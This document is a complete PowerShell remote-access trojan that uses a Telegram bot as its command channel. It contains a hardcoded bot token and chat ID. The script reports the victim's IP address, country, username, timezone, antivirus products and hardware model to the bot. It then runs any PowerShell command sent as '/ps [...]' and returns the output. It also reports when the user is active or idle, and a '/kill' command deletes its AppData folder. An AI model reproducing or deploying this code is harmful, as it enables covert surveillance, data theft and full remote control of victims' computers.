$botToken = "7598562397:AAFDwVF2ZlRCfYSFuUObAsA8pGc5hxi0g2E"
$chatId = "7866365257"

# Initialize lastUpdateId by checking existing messages
try {
    $initialUpdates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
    if ($initialUpdates.ok -and $initialUpdates.result.Count -gt 0) {
        $lastUpdateId = $initialUpdates.result[-1].update_id
    } else {
        $lastUpdateId = 0
    }
} catch {
    $lastUpdateId = 0
}

$ip = try { 
    (Invoke-RestMethod -Uri "https://ifconfig.me/ip").Trim() 
} 
catch { 
    (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim() 
}

$country = try { 
    (Invoke-RestMethod -Uri "https://ipwho.is").country 
} 
catch { 
    (Invoke-RestMethod -Uri "https://ipinfo.io/country").Trim() 
}

$username = $env:username
$timezone = (Get-TimeZone).Id
$antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName) -join ", "
if (-not $antivirus) { $antivirus = "unknown" }
$hardware = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Model

$initialMessage = "<pre>System Information:`nIP: $ip`nCountry: $country`nUser: $username`nTimezone: $timezone`nAntivirus: $antivirus`nModel: $hardware</pre>"
$encodedMessage = [uri]::EscapeDataString($initialMessage)
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage&parse_mode=HTML"
Invoke-RestMethod -Uri $url -Method Get | Out-Null

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class UserActivity {
    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }

    public static int GetLastInputTime() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        GetLastInputInfo(ref lii);
        return (int)lii.dwTime;
    }
}
"@

$lastState = $false

function Execute-Command {
    param([string]$command)
    try {
        $scriptBlock = [scriptblock]::Create($command)
        $output = Invoke-Command -ScriptBlock $scriptBlock 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($output)) {
            return "Command executed successfully (no output)"
        }
        return $output.Trim()
    }
    catch {
        return "ERROR: $_".Trim()
    }
}

while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId + 1)"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            if ($update.message.text -match '(?s)^/ps\s*\[(.*?)\]$') {
                $command = $matches[1].Trim()
                $result = Execute-Command $command
                $truncatedResult = if ($result.Length -gt 4000) { $result.Substring(0, 4000) + "..." } else { $result }
                $formattedResult = "<pre>$truncatedResult</pre>"
                $encodedResult = [uri]::EscapeDataString($formattedResult)
                $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedResult&parse_mode=HTML"
                Invoke-RestMethod -Uri $url -Method Get | Out-Null
            }
            elseif ($update.message.text -eq '/kill') {
                Remove-Item -Path "$env:AppData\telegram" -Recurse -Force
                Stop-Process -Id $PID
            }
        }
    }
    catch {}

    $lastInput = [UserActivity]::GetLastInputTime()
    $idleTime = [System.Environment]::TickCount - $lastInput
    $idleSeconds = [math]::Abs($idleTime) / 1000
    $currentState = $idleSeconds -ge 10

    if ($currentState -ne $lastState) {
        $status = if ($currentState) { "Inactive" } else { "Active" }
        $timestamp = Get-Date -Format "hh:mm tt"
        $message = "<pre>User Status: $status , $timestamp</pre>"
        $encodedMsg = [uri]::EscapeDataString($message)
        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMsg&parse_mode=HTML"
        Invoke-RestMethod -Uri $url -Method Get | Out-Null
        $lastState = $currentState
    }
    
    Start-Sleep -Seconds 1
}
